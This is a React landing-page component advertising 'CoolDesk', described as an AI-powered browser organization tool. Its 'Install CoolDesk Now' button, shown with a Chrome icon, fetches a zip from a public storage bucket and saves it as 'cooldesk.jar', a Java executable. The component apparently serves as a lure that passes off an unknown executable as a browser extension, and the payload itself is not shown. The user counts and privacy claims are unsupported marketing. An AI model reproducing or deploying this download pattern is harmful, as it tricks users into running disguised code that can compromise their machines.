import { ArrowRight, Chrome, Clock, Play, Shield, Sparkles, Zap } from "lucide-react";
import { HeroButton, SecondaryButton } from "./ui/button-variants";

const benefits = [
  {
    icon: Clock,
    title: "Setup in 60 seconds",
    description: "Install, import bookmarks, start organizing immediately"
  },
  {
    icon: Shield,
    title: "Privacy-first design",
    description: "Your data stays local with optional AI enhancements"
  },
  {
    icon: Zap,
    title: "Instant transformation",
    description: "See immediate improvements in browser organization"
  }
];

export const DemoTrialCTA = () => {
  return (
    <section className="py-24 relative overflow-hidden">
      {/* Glassmorphic background effects */}
      <div className="absolute inset-0 bg-gradient-to-br from-primary/20 via-accent/10 to-primary/15 pointer-events-none"></div>
      <div className="absolute top-10 left-10 w-96 h-96 bg-gradient-to-r from-primary/30 to-accent/30 rounded-full blur-3xl animate-pulse"></div>
      <div className="absolute bottom-10 right-10 w-80 h-80 bg-gradient-to-r from-accent/30 to-tech-cyan/20 rounded-full blur-3xl animate-pulse delay-1000"></div>
      <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-[600px] h-[400px] bg-gradient-to-r from-tech-purple/10 to-tech-pink/10 rounded-full blur-[100px] animate-float"></div>

      <div className="container mx-auto px-6 relative">
        <div className="max-w-5xl mx-auto text-center">
          {/* Main CTA */}
          <div className="mb-16 animate-slide-up">
            <div className="inline-flex items-center gap-2 glass rounded-full px-6 py-2 mb-8 hover:shadow-glow transition-all duration-300">
              <Sparkles className="h-4 w-4 text-primary animate-pulse" />
              <span className="text-sm font-medium text-primary">Transform Your Browser in 60 Seconds</span>
            </div>

            <h2 className="text-5xl md:text-7xl font-bold mb-8 bg-gradient-to-r from-foreground via-primary to-accent bg-clip-text text-transparent">
              Meet Your New
              <span className="block">Productivity Superpower</span>
            </h2>

            <p className="text-xl md:text-2xl text-muted-foreground mb-12 max-w-3xl mx-auto leading-relaxed">
              Join 10,000+ researchers and professionals who've transformed their chaotic browsing
              into organized productivity with CoolDesk's AI-powered workspace management.
            </p>

            {/* Primary CTAs */}
            <div className="flex flex-col sm:flex-row gap-6 justify-center mb-12">
              <HeroButton
                asChild
                className="group text-lg px-8 py-4 glass-button border-primary/30 shadow-glow hover:shadow-primary/40"
              >
                <a href="https://pub-af6aeae349144e458766bcc2c2ea78d1.r2.dev/release-28-08.zip" download="cooldesk.jar">
                  <Chrome className="mr-3 h-6 w-6 group-hover:rotate-12 transition-transform" />
                  Install CoolDesk Now
                  <ArrowRight className="ml-3 h-6 w-6 group-hover:translate-x-1 transition-transform" />
                </a>
              </HeroButton>
              <SecondaryButton className="group text-lg px-8 py-4 glass-button">
                <Play className="mr-3 h-6 w-6 group-hover:scale-110 transition-transform" />
                Watch 2-Minute Demo
              </SecondaryButton>
            </div>

            {/* Trust indicators */}
            <div className="flex items-center justify-center gap-8 text-sm text-muted-foreground flex-wrap">
              <div className="flex items-center gap-2">
                <div className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></div>
                <span>Free to install</span>
              </div>
              <div className="flex items-center gap-2">
                <div className="w-2 h-2 bg-green-400 rounded-full animate-pulse delay-300"></div>
                <span>No registration required</span>
              </div>
              <div className="flex items-center gap-2">
                <div className="w-2 h-2 bg-green-400 rounded-full animate-pulse delay-500"></div>
                <span>Works immediately</span>
              </div>
            </div>
          </div>

          {/* Benefits Grid */}
          <div className="grid md:grid-cols-3 gap-8 mb-16">
            {benefits.map((benefit, index) => (
              <div
                key={benefit.title}
                className="glass-card rounded-2xl p-8 text-center animate-slide-up hover:border-primary/30 hover:-translate-y-2 transition-all duration-300 group"
                style={{ animationDelay: `${index * 150}ms` }}
              >
                <div className="w-16 h-16 mx-auto mb-6 rounded-2xl bg-gradient-to-br from-primary/20 to-accent/20 flex items-center justify-center group-hover:shadow-glow transition-all duration-300">
                  <benefit.icon className="h-8 w-8 text-primary group-hover:scale-110 transition-transform duration-300" />
                </div>
                <h3 className="text-xl font-semibold text-foreground mb-3 group-hover:text-primary transition-colors duration-300">
                  {benefit.title}
                </h3>
                <p className="text-muted-foreground leading-relaxed">
                  {benefit.description}
                </p>
              </div>
            ))}
          </div>

        </div>
      </div>
    </section>
  );
};